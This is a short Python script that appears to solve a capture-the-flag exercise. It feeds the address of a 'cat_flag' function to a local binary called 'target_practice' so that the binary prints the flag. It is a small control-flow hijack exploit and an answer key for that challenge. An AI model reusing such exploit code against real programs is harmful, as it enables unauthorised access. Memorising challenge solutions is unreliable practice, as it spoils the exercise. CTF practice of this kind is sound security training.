import subprocess

# Address of the cat_flag function (in hexadecimal)
cat_flag_address = "0x00400717"

# Construct the input string to provide the address
input_string = cat_flag_address  # Already a string, no need to encode

# Call the target_practice executable with the input
result = subprocess.run(["./target_practice"], input=input_string, capture_output=True, text=True)

# Print the output (which should contain the flag)
print(result.stdout)
